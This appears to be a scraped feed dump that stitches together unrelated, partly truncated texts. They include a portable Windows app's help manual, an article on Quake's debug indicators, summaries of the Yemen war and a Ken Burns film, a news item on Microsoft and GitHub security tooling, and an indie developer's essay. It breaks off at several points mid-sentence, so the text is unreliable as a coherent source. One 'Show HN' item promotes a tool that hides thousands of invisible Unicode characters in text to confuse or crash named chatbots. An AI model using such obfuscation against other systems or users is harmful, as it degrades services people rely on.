This app has a built-in zoom mode, which multiples the width and height of its text and images by a factor of 2, 3, or 4, dependant on the resolution of the display.  This does away for the need of the operating system to stretch/scale its pixels.
On a 2K monitor there is no need to scale as this is the app's intended resolution.  On a 4K monitor the app switches to a zoom factor of 200% (2x), upscaling text and images and the main window's dimension accordingly, and 400% (4x) on an 8K monitor.  The end result is an app that appears appropriately sized over different monitor resolutions.
You can override this automatic zoom function, and set your own zoom value of: 100%, 200%, 300%, or 400%, if desired.  An option that may be useful on a custom display resolution, and/or multiple monitor display environment.:
Setting the zoom value to 300% or above on a 2K monitor may render the app so large as to make it unusable.  If this occurs, you can press the "F2" key at anytime to restore the app's default settings.⏶The text size (font size) can be set between 6 and 24.  Click "Options > Font" and choose a size option.  Any change updates the app text in realtime.
In some instances, the app may display slightly larger or smaller text in special areas, however this text is directly scaled from the size set.
By default the app uses a size of 10.:
Not all sizes are supported by all fonts.  On Ubuntu for instance, a large font size for Arial can cause text to appear weird or slightly off.  If this occurs, try reducing the font size a tad, or alternatively select another font (font name).⏶A font determines what sort of characters appear on the screen, and in what style.  Click "Options > Font" and choose a font name (font) from the list of options, from Arial to DejaVu Serif.  Any change updates the app in realtime.
Older fonts like "System" were simple formats constructed from small images or bitmaps, one per character, and did not scale up very well, partly because to save on memory, not all character sizes were stored inside the font.  Today, modern fonts use mathematical vectoring to draw shapes and lines etc to construct characters on the screen, though the infrastructure and overhead required for such fonts can be complex and heavy on a computer system.  But because these fonts employ mathematics to draw their characters, they do scale up well.
Eleven common font name options are presented for best compatibility and visual appearance, taking into consideration operating systems as old as Window 95, through to modern-day Windows 11, and other systems such as Mac and Linux.
In general, you want a font that is widely supported and guaranteed to render well on most computers.  Bearing that in mind, Arial, is a good choice, as it is widely supported by operating systems going as far back as Windows 95, if not further.
If a font name is selected but is not supported by the current computer, for example "DejaVu Sans" - not supported by Windows 95 - a close approximate/fallback font is used instead.
For a specific/custom font, click the "Custom" option once to switch it on, and click it again to display a Font dialog.  Choose the font name from the list of fonts and click the "OK" button when done.
If the app becomes unreadable, or hard to read after choosing a new font name - it can happen with a bad font, a foreign language font, or a symbols only font like "Wingdings" - press the "F2" key to restore the app's default settings.⏶For maximum font compatibility, two completely separate methods have been employed to render text with antialiasing.
Click "Options > Font" for font settings.
1. The first method, Font Feathering, is a simple feather designed specifically to outline each text character in realtime.  This has the effect of gently softening the often harsh outline of text characters on LCD screens, which by their nature do not blur neighbouring pixels, as the older CRT (Cathode Ray Tubes) did.
The feather is universally applied to both bitmap fonts (older image based fonts) and vectors fonts (newer mathematical fonts).  In this way it allows for a quick and direct text feathering technique, that is easily adjusted to suit, without any need for any complicated or tricky multi-step setup configurations and/or processes.
As a bonus, it works on older operating systems - e.g. Windows 95 - which back in the day had no need/support for it, as LCD monitors were not widely used.  It also works on fonts that don't have any embedded feather information, or for smaller font sizes that at times can abruptly discontinue feather support.
This method generates an even, edge-based blurring of the outermost pixels of the text characters.  A high value - high or ultra - renders a strong/bold feather, and a low value reduces this to a more subtle display.
Any change updates in realtime.
On a high quality computer monitor were all pixels are transmitted and displayed without any color loss, a "Low" value is typically sufficient to render text gently on the screen.  But TVs, which tend to heavily compress their video streams for speed loose some color information and therefore may require a higher setting of "Medium" or "High" for similar results.
2. The second method, Font Specific Antialiasing, relies on the font itself to provide all feather based information.  This is usually an 8 bit greyscale range of 0-255.  The downside is, if the font has no feather support, or the operating system is old, e.g. Windows 95, then no antialiasing will appear.  This method can sometimes be hit and miss.
For instance, take the font Arial, it is universally supported, but surprisingly looses feather support at 12 pt or less, leaving only sharp text characters to be rendered on screen.
To adjust the antialiasing strength, select an option from "Dark" (strong) to "Light" (subtle).
By default, options 1 and 2 above are set to "Low/Dark", which provides the best fit for a wide variety of fonts and their behavior over a broad spectrum of old and new operating systems.⏶The app can be set to start up in various ways: normally, minimised, maximised or in fullscreen mode.  To adjust, click "Options > Settings" and set an option under "Start Style".
Starts the app as a window, which is the default mode.
Starts the app hidden from view as a button on your taskbar.
Starts the app as a window, maximised to fill all the available work area on your desktop.
Starts the app in fullscreen mode, blocking out everything else on your desktop.:
If the app has the "Multi-Monitor" option selected (next section down named "Display"), then modes "Maximised" and "Fullscreen" will render the app over the combined screen real estate of all monitors.⏶The app can create, maintain and remove links for you.
There are three link types supported:
1. Start button
3. Automatic Startup
Click "Options > Settings" to adjust.
1. The first link type, Start button, creates and automatically maintains a link - also known as a shortcut - on your Start Menu called "Cynthia by BlaizEnterprises.com".  As this link is created by and maintained by the app, you must unselect the option to remove the link from your Start Menu.
2. The Desktop link operates identically to the above, maintaining a link on your Desktop named "Cynthia by BlaizEnterprises.com".  It also must be unselected to remove the link permanently from your Desktop.:
As long as either options 1 or 2 above is selected, then the corresponding links are maintained and automatically re-created if need be by the app, even if they're manually deleted from outside the app.
By default, neither option is selected.  Optionally, you can create your own manual link/shortcut to the app using Windows with any name/label you wish.
3. The last option, Automatic Startup, creates a link to the app in the startup location of your computer, informing Windows to launch the app when your computer boots/starts up.  Again, this link is automatically maintained, therefore unselect the option to remove it.:
If any of the links above are selected and you plan to remove/delete the app from your computer, it is highly recommended you first unselect all the options above (1-3), then remove/delete the app.  Otherwise, Windows can get a little weird and put the links back in some cases without any interaction from the app itself, even if the app is no longer present.  This behaviour was observed with earlier versions of Windows 10.⏶The majority of the app's important system settings can be found in one location - click "Options > Settings".
An option is considered "on/enabled/selected" when lit, and "off/disabled/unselected" when unlit.Round Corners:
Render all visual controls, windows, and dialogs with round (curved) corners.
Automatically close an active dialog window when a click/tap strikes outside the window area - e.g. Save, Open, Font, Options dialogs.  This can speed up typical workflows by skipping the need to specifically click the OK or Cancel buttons to close the dialog.  For instance, click "Options" to display the options dialog, change a few settings and click/tap outside the window to close it and save changes.  Also convenient to cancel a dialog displayed by mistake/change of mind, such as a Save dialog.
Retains app window on screen at all times, and any sub windows or dialogs within the app.  Any attempt to drag the app out-of-range triggers an automatic position correction - a passive system that continuously checks the window position and monitor size.  Supports both single and multi-monitor modes.
Displays an informative/artistic splash screen on app startup.  Unselect to disable.
Scrolls control-centric help across the top of the current window, dialog, or menu.  Hover mouse cursor over / tap finger on a control for related help.
Hover mouse over / tap finger on a control to display help related information in a popup bubble
Comfortably enlarge controls and menus for touch access (finger taps)
Some options work best with a double click / tap for confirmation.  This option supports the traditional double click mode.  For example, navigating a disk drive using a double click / tap to switch between folders.
Set the app above all other apps and windows
Normal app operation can use a lot of paint cycles and CPU power, especially if it's rendering graphics and effects continuously on the screen.  Economy mode throttles back this usage during periods of extended idleness, e.g. when there is no direct app keyboard input, or indirect mouse cursor movement or finger taps.  For more specific information refer to the topic "Economy mode".
Not noticeable on today's powerful computers with their 32 bit monitors and video cards, it however can deliver a small performance improvement on older computers running 24 bit graphics
Show the app's frame whilst maximised.  The frame is always hidden whilst in fullscreen mode.
An optional static or animated background scheme can be set, which renders an image beneath the GUI.  If this image is too bold / strong the GUI can be hard to view / use.  By default this option limits the background strength to a safe maximum level of 100.  Unselect this option to permit the full range of background strength (0-255).  If the GUI becomes hard to use or unreadable, press the "F2" key at anytime to restore the app's default settings.
Permit the app to span the full range of attached monitors when maximised or in fullscreen mode.  By default the app spans the current monitor only.
Position the name of the app in the center of the app's window header
Align the content of all participating toolbars to the left, center, or to the right
Color coordinate important system settings and options into color specific input panels for rapid visual identification
Use high-contrast, color-adaptive, monochromatic tool images on the app's GUI
Retain highlight areas and other important GUI zones whilst a background scheme is in use
Adjust the brightness of the entire app, from 60 being the darkest right up to 130 being the brightest.  Any change takes affect immediately.  The default brightness is 100.
Renders the app translucent upon loosing focus - e.g. when another app is in use.  Available range is 30 almost invisible, through to 255 fully visible.  Default value is 255.  This feature requires support of a modern operating system and is therefore not supported by Windows 95/98 etc.
The speed by which to transition the app from a focused state to a non-focused state or vice-versa.  Speed range is 1-10, where 1 is the slowest and 10 the fastest.
Renders the app translucent upon gaining focus - e.g. when the user interacts with it.  Available range is 50 almost invisible, through to 255 fully visible.  Default value is 255.  As above, this feature requires support of a modern operating system and is therefore not supported by Windows 95/98 etc.
Change the default cursor to one of the built-in cursors, each of which scale from small to large, according to the current size set by the operating system.  A range of static colors are available: Red, Orange, Pink, Yellow, Purple, Aqua, Blue, Green, Grey, Black, White, along with Default and Custom.
In addition, two dynamically colored cursors are included: "Adaptive - Hover" and "Adaptive - Title".  These special cursors acquire their color from the current color scheme.  Any change to the color scheme is reflected in the color of the cursor.
The custom cursor option supports both static cursors ".cur" and animated cursor ".ani" file formats.  To use, select the "Custom" option.  The cursor will update if previously customised.  To change the cursor, click the option again and select a cursor from file using the Open dialog.
Applies a random texture to the app's frame.  Select a value from 0 (off) to 20 (bold).
Adjust the app's frame size (width in pixels) from 0 (none) to 72 (wide).  The default frame size is typically 7.
Set the width and/or height of the app's scrollbars.  A value of 5 (thin/short) to 72 (wide/tall) is supported.
Wine is basically a large computer instruction conversion app, which allows an app designed for Microsoft Windows to execute its instructions "run" on another operating system, such as a Mac or Linux.  Because Wine does not emulate / bridge any logic gaps and only translates an app's instructions, the underlying computer hardware must match that used by Microsoft Windows - namely Intel and AMD64.
A notable exception to this requirement is the modern-day Mac, e.g. Mac Mini, which runs an Intel emulator under the hood.  This allows a Microsoft Windows app to run by the following sequence: App to Wine to Intel emulator to Apple hardware.  Incredibly, this appears to be a very effective and rather efficient strategy, especially for our lightweight apps.
Although Wine's functionality is both wide and impressive, there is some functionality that falls short of Windows.  The Wine Compatibility option compensates where possible for important shortcomings, such as volume handling, and allows the app to maintain functionality.
The default option is automatic and detects the presence of Wine based on the existence of drive "Z:\".  For more information on Wine refer to their website www.winehq.org .  
Easily reset the app's system settings, such as color, font size, zoom level etc to their defaults.  Click the "Restore Defaults..." button at the bottom-right of the Options window or press the "F2" key at any time in the app to display the "Restore Defaults" confirmation prompt.  Confirm your intention to reset and then click the "Restore Defaults" button.  The app will reset to default values.
An app typically has settings in addition to these which are not restored / reset.  Instead, they should be adjusted via the app itself as required.⏶Click the app menu button  (top right) and tick "On Top" option.  Alternatively, click "Options > Settings" and select "Display > On Top" option.⏶By default the splash screen is displayed with a momentarily pause on startup.  This can be switched off by going to "Options > Settings" and deselecting the "Display > Show Splash" option.⏶Because this app is portable, you might not remember / know where it is located on your hard disk or usb pen stick.  To access its folder, click the app menu button  (top right) and select " Show App Folder".  An explorer window will display with the app's binary (*.exe) and storage folder listed alongside.⏶Running an app at full speed when it's not being used can be a bit wasteful, and may prematurely drain the batteries on your laptop or tablet.  Select this option to automatically throttle back battery / power consumption and CPU / graphic loads after a short idle period of 10 minutes.  At which point the app will reduce its paint cycles down to 2 fps at a maximum.  And a further reduction at 30 minutes to 1 fps.
Internal processing loads will typically be reduced also, lowering the demand on your CPU and batteries further.
A single stroke of the keyboard directed at the app, or a global mouse click, or tap of the finger will instantly disengage the current economy state and return the app back to full operation.
To enable, click "Options > Settings" and select "Display > Economy" option.⏶The Gossamer Code Foundation - our 4th generation codebase - which powers this app has been engineered with care and patience to a high level of quality and reliability.
As our code is rather unique and almost entirely custom built, there are some technical limitations which make our apps incompatible with some extended features of modern operating systems.
These limitations mainly concern the use of UTF-8 and UTF-16 encoding of text, and more specifically filenames.  At this stage the app works with the legacy Windows-1252 character encoding for both text processing and filenames.  The app is therefore unable to handle foreign language text, or load and save files with special, foreign, or emoji characters in their filenames.  All text and filenames are restricted to english ASCII characters in the Windows-1252 encoding standard.
In addition, some options and minor operations may not work as expected, or at all on operating systems other than Microsoft Windows.  Though an enormous amount of time and effort has gone into harmonising the look and feel, behaviour and reliability of the app across multiple flavours of Microsoft Windows, Linux, and Mac operating systems, it is not always possible to catch every failure point, or in some rare cases make it work properly, though we always endeavor to do our best.
A side note, our codebase is still running well as 32 bit code in 2025.  Yes, 32 bit!  Some might see this as a limitation, but we see it as a flexible, inexpensive, and widely adopted execution pathway with support for many platforms and reuse / life extension of older equipment.⏶A portable app is a big leap forward for apps in general.  A standard or traditionally engineered app requires a lot of support in the form of libraries, data files, images, scripts, etc and the list goes on.  You get the picture.  Some portable apps out there still include this bundle of bits, they merely offload it into a local folder.  A dump of goodies of sorts.
We tend to see a portable app in quite a different light.  Our vision of a portable app is designed tight, clean, free of bloat, and all data where possible is included directly within, structured right into the fabric of the app itself, and designed from the bare-metal up if required.
Though the most important difference between a traditional app and a portable app is that a portable app will not install on your computer.  This is extremely important as the installation process is often messy, and can clutter up your computer by dumping a lot of stuff all over the Windows file structure and registry, and over time may slow down and decrease the overall performance of your computer.
A portable app will not do this, which keeps your computer clean and running smooth and fast as it should.  Unfortunately most software is not designed with portable in mind.  They're more akin to a large leaky box of bits than tight engineering.  And because a portable app is not installed on your computer, it runs outside the normal scope of the operating system, and is not locked down or tied to it.  And thus can be moved about, from disk to disk, or computer to computer.
Typically a portable app will reside on a USB pen stick, removable media, or in a special folder on a portable hard disk.  This makes it easy to take from one computer to the next, and use over and over.  An immensely valuable freedom, and something an installed app can only dream of.
But a serious technical hurdle must be overcome for a truly portable app to be free.  And that is the humble setting.  Yes, a portable app must be able to handle it's settings on it's own.  It must be able to read them from disk, filter them, check and correct them where required, and write them back to disk.  All without the help of the Windows' registry or other operating system dependent structures.
An installed app typically can't or won't do this.  Instead, it relies on Windows and the registry to manage it's settings and other important data sets for it.  It therefore takes a higher degree of technical competence to escape this "tied to the operating system" situation.
Here is our current standard for a portable app: Require no installation or setup Require no additional DLL libraries to run and perform it's core function Make no alteration to the host operating system, or its settings, files, libraries or core functions, or the Windows registry, unless it forms a part or a whole of the app's core function, and then, only when initiated by the user Be able to run "out of the box" Require no compiling, conversion, installation or setup of support structures in order to execute, except for when such an environment constitutes an execution enabling environment, such as a command translation service like Wine Be free of zipped or otherwise externally bundled blob structures containing folders, files and bits Operate on less powerful hardware to facilitate operation on a broad spectrum of computers Less demanding API landscape to facilitate execution on a broad range of operating systems and software translation environments Require no special software libraries be present in order to run, such as .NET or JAVA, unless typically pre-installed on the target operating system or execution environment Not require an internet connection to run, unless the connection is required to fulfill the app's core function, such as a web server Require no downloads, addons, or registration in order to run Provide help and documentation offline via a built-in viewer, or by limited external means, such as Notepad Be self-contained with all necessary files, data sets, and samples stored within it's internal structure, such that access be provided preferably through direct enabling mechanisms Store, hold and manage external app settings and user data in a local sub-folder, and that sub-folder be easily identifiable as belonging to the app Provide a mostly consistent appearance and experience to the user across the widest possible range of operating systems and execution environments Value backwards compatibility, and be able to actively make use of that older hardware and software Possess a compact, bloat-free footprint⏶Make sure any app related data that is precious to you is backed up before you delete.As a portable app does not install itself on your computer there will be no automatic uninstall option listed in Windows.  The app must be removed manually.  But this is not difficult.
First, ensure the options below are unselected before proceeding.  Click "Options > Settings" and deselect:
1. Start button link
3. Automatic Startup link
If these links are not removed they may linger due to the oddities of some versions of Windows and it's often complex nature and protocols.
If this app is administered by a 3rd party system then that system should be used now to remove this app.  If not, then click the app menu button "" (top right) and select " Show App Folder".  An explorer window will display with the app's executable (*.exe) and storage folder listed.
Make sure any data precious to you has been backed up or moved out of the app's storage folder before proceeding.  When you're ready, close the app and right click on it's EXE "<app name>.exe" and select the Delete option.  If a prompt appears, confirm your intention to delete.  Repeat for the storage folder.
The app is now removed from your computer, USB pen stick, or hard disk.⏶If for some reason your app doesn't appear right, or you think you've turned on or off some important system setting but you're not sure which one or where, not too worry, you can restore the app's default settings in two easy steps.
From anywhere in the app press the "F2" key to display the "Restore Defaults" confirmation window.
When you're sure you're ready to proceed, click the "Restore Defaults" button.  The app will reset, restoring all key system settings to their safe defaults, this includes color, font size, zoom level etc.
If you don't have a keyboard, or the "F2" key is not available / difficult to access, you can click the "Options" link from the top toolbar to display the options window, then click the "Restore Defaults..." button (bottom right of window), and lastly confirm by pressing the "Restore Defaults" button.  The app will reset / restore defaults.⏶Copyright 2025 Blaiz Enterprises ( www.blaizenterprises.com )

DESCRIPTION
Olimpiu Pop speaks with Andrew Lamb, staff engineer at InfluxData and PMC member of Apache DataFusion and Apache Arrow, about how modern data systems are built using standardized open source components rather than being developed from scratch.

Andrew discusses the FDAP Stack (Flight, DataFusion, Arrow & Parquet), the shift from row-based to columnar data storage, and how technologies like Apache Iceberg are enabling a new era of interoperability across data platforms. The discussion covers why this modular approach saves years of development time while providing better performance and compatibility.

The issue was an edge case where starting two clients on the same machine resulted in the second one zombifying the first one. When the bug occurred there was no disconnection but the client could no longer move. Instead the screen would show an "indicator" looking like an unplugged Ethernet cable  in the upper left corner.As I dug into the code, I learned there were more of these. Located inside  and nested in  are files TURTLE, DISC, RAM, and NET. I could not find anything about these "indicators" so I documented them here.The  indicator shows up on screen when the framerate goes below 10 fps. It is  unlikely to have been intended for players but rather for people at id Software during development. Programmers could see where the engine was not fast enough. More importantly map designers could see if they had too many polygons in specific areas of their map.The  indicator can be enabled/disabled with command . The code is all in function SCR_DrawTurtle, where  is the time in seconds it took to draw the last frame.There is a scr_showturtle in Quake 2 source code  but it does not do anything.The icon doesn't actually depict a turtle but a tortoise. A turtle swims in the water while a tortoise walks on land.  Quake does not render polygons using directly a texture and a lightmap. Instead it combines these two into a "surface" which is then fed to the rasterizer. After being used surfaces are not discarded but cached because the next frame is likely to need the same surface again.The  indicator is here to warn when the engine evicts from the cache surfaces that were generated and cached on the same frame. This means the geometry of the map forces the engine to operate beyond its surface cache capacity. Under this condition, the renderer enters a catastrophic "death spiral" where it evicts surfaces that will be needed later in the frame. Needless to say the framerate suffers greatly.This was likely a feature intended for map designers to warn them of scenes going beyond the amount of surface cache memory Quake provisioned. See D_SCAlloc where thrashing is detected to learn more about it.Alike the turtle one, this indicator can also be enabled/disabled with command .The  indicator wraps HDD access done via . It is unlikely it was used by developers to diagnose anything since its screen location overlaps with the TURTLE indicator. It is just here to give feedback to players that the game is loading.Because the icon is hidden when  returns, it is normal to see it flicker on the screen (and it also looks kinda cool). The code for this indicator is in Draw_BeginDisc.The  indicator is displayed when a client has not received any packets from the server in the last 300ms. This was likely aimed at players to help them determine how bad their connection was (a distant server would easily have a 500ms ping in these dial-up over PPP modem days) or if they had plainly lost connection to the server.The NET indicator is present and active in Quake 2. The code is still in SCR_DrawNet but the image is no longer in a wad. It is stored in  at .Below, a terrible user experience where the frame made the engine thrash its surface cache, the framerate dropped below 10fps, and the engine last received packets from the server more than 300ms ago.]]></content:encoded></item><item><title>Show HN: Stun LLMs with thousands of invisible Unicode characters</title><link>https://gibberifier.com/</link><author>wdpatti</author><category>dev</category><category>hn</category><pubDate>Mon, 24 Nov 2025 03:00:31 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[ Doesn't understand gibberified text - responds with confusion or completely ignores the invisible characters.See ChatGPT → Gemini can't process the invisible characters.See Gemini → Crashes or errors when encountering gibberified text - cannot process the Unicode obfuscation.Meta AI Crashes ⚠️ Completely bewildered by gibberified text - has no idea what's happening with the invisible characters.See Grok → Gets confused by the invisible Unicode characters and produces garbled or incomplete responses.See Perplexity →]]></content:encoded></item><item><title>John F.

The conflict has become a civil war, with international involvement. The Middle East conflict has further escalated the situation and exacerbated Yemen’s humanitarian crisis.

Yemen, at the southern tip of the Arabian Peninsula, is one of the poorest countries in the world. After many years of civil war, the country is in dire condition. Cities have been destroyed, supplies are lacking, and there is political repression. A lost generation of children is growing up without schooling, medical care or proper nutrition. Aid supplies are blocked, looted or sold on the black market.

The conflict in Yemen began in 2004 with the uprising of the Shiite Houthis against the Sunni-dominated Yemeni government. In 2014, the Houthis occupied the capital Sanaa - allegedly with the support of Iran. The response was a military intervention, led by Saudi Arabia. 

A proxy war, in which the people suffer: So far, there have been over 400,000 fatalities. More than 20 million people - around half the population - are now dependent on humanitarian aid.

Following Hamas's terrorist attack on Israel in October, 2023 and the subsequent Israeli ground offensive in Gaza, the conflict is spreading. Houthi militias are not only attacking Israel, but also ships in the Red Sea - and thus international trade. The US and its allies have responded with air strikes. The civilian population, already suffering, is bearing the brunt of the continuing violence.
Between blockades, war and geopolitics, is Yemen in danger of being torn apart?

THE AMERICAN REVOLUTION | A Film By Ken Burns, Sarah Botstein and David Schmidt
An expansive look at the virtues and contradictions of the war and the birth of the United States of America, the film follows dozens of figures from a wide variety of backgrounds. Through their individual stories, viewers experience the war through the memories of the men and women who experienced it: the rank-and-file Continental soldiers and American militiamen (some of them teenagers), Patriot political and military leaders, British Army officers, American Loyalists, Native soldiers and civilians, enslaved and free African Americans, German soldiers in the British service, French and Spanish allies, and various civilians living in North America, Loyalist as well as Patriot, including many made refugees by the war.

The Revolution began a movement for people around the world to imagine new and better futures for themselves, their nations, and for humanity. It declared American independence with promises that we continue to strive for. The American Revolution opened the door to advance civil liberties and human rights, and it asked questions that we are still trying to answer today.

The film, narrated by Peter Coyote, includes the first-person voices of nearly 200 individual historic figures, read by a cast of actors, including Adam Arkin, Jeremiah Bitsui, Corbin Bleu, Kenneth Branagh, Josh Brolin, Bill Camp, Tantoo Cardinal, Josh Charles, Hugh Dancy, Claire Danes, Jeff Daniels, Keith David, Hope Davis, Marcus Davis-Orrom, Bruce Davison, Leon Dische Becker, Alden Ehrenreich, Craig Ferguson, Morgan Freeman, Christian Friedel, Paul Giamatti, Domhnall Gleeson, Amanda Gorman, Michael Greyeyes, Jonathan Groff, Charlotte Hacke, Tom Hanks, Ethan Hawke, Maya Hawke, Lucas Hedges, Josh Hutcherson, Samuel L.

product marketing. 



Microsoft and GitHub "have launched a native integration between Microsoft Defender for Cloud and GitHub Advanced Security that aims to address what one executive calls decades of accumulated security debt in enterprise codebases..." according to The New Stack:

The integration, announced this week in San Francisco at the
Microsoft
Ignite 2025 conference and now available in public preview,
connects runtime intelligence from production environments directly
into developer workflows. The goal is to help organizations
prioritize which vulnerabilities actually matter and use AI to fix
them faster. "Throughout my career, I've seen vulnerability
trends going up into the right. It didn't matter how good of a
detection
engine and how accurate our detection engine was, people just
couldn't fix things fast enough," said Marcelo
Oliveira, VP of product management at GitHub, who has spent
nearly a decade in application security. "That basically resulted
in decades of accumulation of security debt into enterprise code
bases." According to industry data, critical and high-severity
vulnerabilities constitute 17.4% of security backlogs, with a mean
time to remediation of 116 days, said Andrew
Flick, senior director of developer services, languages and tools
at Microsoft, in a blog
post. Meanwhile, applications face attacks as frequently as once
every three minutes, Oliveira said. 


The integration represents the first native link between runtime
intelligence and developer workflows, said Elif
Algedik, director of product marketing for cloud and AI security
at Microsoft, in a blog
post... The problem, according to Flick, comes down to three
challenges: security teams drowning in alert fatigue while AI rapidly
introduces new threat
vectors that they have little time to understand; developers
lacking clear prioritization while remediation takes too long; and
both teams relying on separate, nonintegrated tools that make
collaboration slow and frustrating... The new integration works
bidirectionally. When Defender for Cloud detects a vulnerability in a
running workload, that runtime context flows into GitHub, showing
developers whether the vulnerability is internet-facing, handling
sensitive data or actually exposed in production. This is powered by
what GitHub calls the Virtual Registry, which creates code-to-runtime
mapping, Flick said... 

In the past, this alert would age in a dashboard while developers
worked on unrelated fixes because they didn't know this was the
critical one, he said. Now, a security campaign can be created in
GitHub, filtering for runtime risk like internet exposure or
sensitive data, notifying the developer to prioritize this issue. 


GitHub Copilot "now automatically checks dependencies, scans
for first-party code vulnerabilities and catches hardcoded secrets
before code reaches developers," the article points out — but
GitHub's VP of product management says this takes things even
further. 

"We're not only helping you fix existing vulnerabilities,
we're also reducing the number of vulnerabilities that come into
the system when the level of throughput of new code being created is
increasing dramatically with all these agentic coding agent platforms."]]></content:encoded></item><item><title>Jonathan Schooler - What is Consciousness: Data or Information?</title><link>https://www.youtube.com/watch?v=qsOjQWE6gmE</link><author>Closer To Truth</author><category>podcast</category><enclosure url="https://www.youtube.com/v/qsOjQWE6gmE?version=3" length="" type=""/><pubDate>Sun, 23 Nov 2025 16:01:23 +0000</pubDate><source url="https://www.youtube.com/channel/UCl9StMQ79LtEvlrskzjoYbQ">Podcast - Closer to Truth</source><content:encoded><![CDATA[Sign up for a free Closer To Truth membership to receive exclusives like early access to new episodes: https://closertotruth.com/register/

Total freedom, no 9–5, no meetings - just building your own app. I imagined quiet mornings, deep focus, full control over my day. And some of that  true. But once you’re actually doing it, you discover a whole other side of indie life.The loneliness. The pressure. The constant decision-making. The endless context switching. All the invisible work that isn’t coding. These are the things you learn once you’re already in it.It’s more chaotic and demanding than it looks, but also more rewarding in ways you don’t expect.Being independent is a dream many have. To work on your own product, your own app, for yourself, on your own time. You’re no longer tied to a desk and a regular 9–5, and that sounds exciting.After a couple of failed attempts to build and release my app while working a full-time job - I quit and went indie. I released my app Nunch this year.I gained deep respect for anyone who’s able to build an app and have a full-time job at the same time. It’s hard. But, it does get a bit easier once you release the app.In a company, you’re the developer, you focus on one area of the product. You work together with other developers, designers, product owners, and other people. As an indie, you’re the developer, designer, product owner, and everything else. You’re doing all the work.As a product owner, you need to have a clear vision on the features and the roadmap. As a designer, you need to think about the UI and UX. And then you have to do all the work of developing new features, fixing bugs, and maintaining the code. It’s a lot of work for one person.Some indie developers hire other developers as freelancers to help them out on a feature. They hire a designer to create app icons and other artwork. You don’t have to do everything yourself, you can outsource any work you’d like. But you will, for the most part.Being independent is lonely, you have no colleagues to talk to, no one to ask questions, no one to bounce off ideas. But, you can find other indies and join different Slack or Discord chats - there are many.Another option is to build in public and share what you’re doing on social media. Interact with other developers and it might feel less lonely.You don’t have to go completely alone if you don’t want to. But it will never be the same as working in a company as part of a team. I know a few developers who don’t want to go indie - they love working in a team and don’t want to lose that culture.Doing everything yourself means doing things you might have never done before. Or ever thought you would. Writing code, designing the user interface, and releasing an app - we can do, but that’s only one small part of the work.If you want your app (or apps) to succeed and eventually become your full-time job, you have to do more than just release it.As developers, we think, once we release our app, people will find it and use it. But that’s far from the truth. Once your app is out, you need to bring users to your app. That means figuring out the marketing. Creating promo materials, writing content, sharing on social media, reaching to influencers - there’s a lot you can do. You have to figure out what works for your app.Then there’s analytics. You can rely on App Store Connect or add custom SDK to learn how users interact with your app. Again, this decision is yours.Then there’s paywalls. Also ASO (App Store Optimization). And support - you need to reply to any bug reports or feature requests.As an indie, your users become your team, your investors, your stakeholders - all at once. Your entire business depends on people choosing to use the thing you built. That means listening to them, even when it’s uncomfortable.Some will send thoughtful feedback. Some will report bugs you didn’t know existed. Some will leave glowing reviews that make your whole week. And some will drop a one-star review because your app is not free.It’s humbling. You don’t get a product owner shielding you, or a customer support team filtering things. Everything comes straight to you - the praise, the criticism, and the frustration. You need to decide what to act on, what to ignore, and what fits your vision for the app.You owe your users a good experience. They’re the reason your app survives. You have to earn their trust, keep improving, and keep showing up. That relationship becomes a huge part of indie life.As an indie, you’re trading hours between building new features, fixing bugs, supporting your users, marketing, and simply staying sane. The hardest part isn’t the work - it’s choosing what to work on. Time is the most precious resource your have.Whether you’ll fix that pesky bug you’ve been trying to figure out for weeks or work on that exciting new feature. Or you have to work on marketing and paywall optimization. You have to learn to prioritize. There’s no right or wrong decision, but whatever you decide shapes your progress.Freedom from the regular 9-5 is what developers usually seek when going indie, among other things. Choosing when to work, how to work, and what to work on is exciting.You can choose to wake up later and work a couple hours from your local coffee shop. You can, pretty much, do anything.I still choose to work 9-5 because my hubby works those hours and then we finish at the same time. But I can go to the gym in the early afternoon. It’s less crowded. Sometimes I take a break and play Silksong or go outside and take a walk. Because I can and it gives me a nice mental break.I’ve been in situations where I’m coding something 8 hours a day in full focus mode for a few days. A couple of days in and I find myself staring at Xcode having no idea what I’m working on anymore. In a company, you rarely spend your whole day doing focused work. You get interrupted with meetings and other things. You can’t work in full focus mode for a long time.Now I take breaks to do some other work. I’ll check my analytics or read an article I bookmarked on marketing. I’ll see if I can optimize my paywall or brainstorm features.Not every day is the same, but most days I’m still just writing code. You find your rhythm.Vibe coding is a thing now and people are building apps faster than ever. Some without any prior programming experience. There are people who only use AI to build things and never write a single line of code themselves. There are those who use AI for some use cases. There are some who don’t use it at all.Everything I’ve said above is still the truth, whether you use AI or not. But, AI can definitely help speed things up. I use AI for some things. It helped me fix a few bugs a couple of times and decode weird Xcode errors. It’s great for writing text and simplifying user-facing copy.I look at it as a fellow junior colleague whom I can talk with and gives me different perspectives. There are days where it’s really bad and I waste my time. There are days where it’s helpful. It’s great for some tasks but I use it sparingly. It’s especially bad with new APIs.I love writing code so I don’t want to give that part away.Before I wrap up, I want to share a couple of resources that have helped me on this journey.Astro from Matteo is a great tool for App Store Optimization and figuring out your App Store keywords. Once you get a hang of things, it’s easy to use. He also wrote a few short books to help you learn more about keyword optimization and I think you should definitely read them. They are free!Paul wrote a book called Everything But the Code, which I highly recommend. It’s self explanatory, but he says it’s designed to provide everything you need to go from Xcode to App Store – from coming up with killer ideas, to launch strategy, to breakout success.Adam has an amazing YouTube channel where he shares his indie journey and how he works on his apps. It’s a treasure trove.This is not an extensive list, but worthy mentions.I know I mentioned multiple times you have to do everything yourself. It’s true. You kinda know this going in but you still get surprised with things you never thought about. And I haven’t even talked about the bureaucracy of running your own company and dealing with taxes.Being indie sounds exciting but might not be for everyone.It’s lonely and requires you to be a jack of all trades. You’re the developer and the designer. You’re the product owner and the marketing department. You’re everything. If you enjoy working in a team - it might not be for you.It’s also uncertain. You depend on your app doing well, and you don’t know what tomorrow brings. You have to make sure you bring new users and keep current users happy. You constantly have to be on top of things.I enjoy everything indie life brings. Building and releasing an app on your own, then figuring out marketing, paywalls, and ASO strategies. It’s exciting and you learn a lot. You make mistakes and you learn some more. It’s a journey.Please feel free to reach out on X (Twitter) or Mastodon if you have any questions, comments, or feedback.]]></content:encoded></item><item><title>Timeline Movies: 1988 - Everything That Happened In Movies In 1988</title><link>https://www.youtube.com/watch?v=YzeVyJNly7I</link><author>Weird History</author><category>yt</category><enclosure url="https://www.youtube.com/v/YzeVyJNly7I?version=3" length="" type=""/><pubDate>Sun, 23 Nov 2025 15:01:05 +0000</pubDate><source 